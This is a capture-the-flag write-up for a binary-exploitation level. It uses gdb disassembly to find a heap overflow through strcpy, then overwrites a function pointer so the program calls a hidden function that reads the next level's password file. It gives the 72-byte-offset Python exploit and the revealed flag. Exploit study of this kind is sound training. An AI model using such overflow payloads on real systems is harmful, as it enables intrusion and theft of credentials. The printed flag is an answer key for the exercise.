# Level 6

First step - testing the program
```
$ ./level6
Segmentation fault (core dumped)
$ ./level6 Hello
Nope
```
The program segfault without parameters, print "Nope" with

Waiting a password in parameter?
```
Start in GDB

gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804847c <+0>:		push   ebp
   0x0804847d <+1>:		mov    ebp,esp
   0x0804847f <+3>:		and    esp,0xfffffff0
   0x08048482 <+6>:		sub    esp,0x20
   0x08048485 <+9>:		mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.
```
There is a function pointer at line "+41", the address of this function is "0x8048468"
```
(gdb-peda)$ info function
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy@plt
0x08048350  malloc@plt
0x08048360  puts@plt
0x08048370  system@plt
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
```
It's the address of the function `m`, there is also a non-called function `n`
```
(gdb-peda)$ disas m
Dump of assembler code for function m:
   0x08048468 <+0>:		push   ebp
   0x08048469 <+1>:		mov    ebp,esp
   0x0804846b <+3>:		sub    esp,0x18
   0x0804846e <+6>:		mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret
End of assembler dump.
```
Just a call to `puts`

Let's see the non-called `n` function
```
(gdb-peda)$ disas n
Dump of assembler code for function n:
   0x08048454 <+0>:		push   ebp
   0x08048455 <+1>:		mov    ebp,esp
   0x08048457 <+3>:		sub    esp,0x18
   0x0804845a <+6>:		mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
End of assembler dump.
```
There is a call to the `system` function with a string on parameter
```
(gdb-peda)$ x/s 0x80485b0
0x80485b0:	"/bin/cat /home/user/level7/.pass"
```

---

We can understand the goal, need to execute the `n` function


So we can use a bufferoverflow for overwrite malloc's chunck, and replace the address in function pointer.

```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

r "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"

Stopped reason: SIGSEGV
0x65414149 in ?? ()

gdb-peda$ pattern offset 0x65414149
1698775369 found at offset: 72

gdb-peda$ x n
0x8048454 <n>
```
Ok ! We have all stuff for write our exploit

```
#!/usr/bin/python

import struct

PAD = "A"*72;

FT_N = struct.pack("I", 0x8048454)

print PAD+FT_N
```

```
./exploit > payload

./level6 `cat payload`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
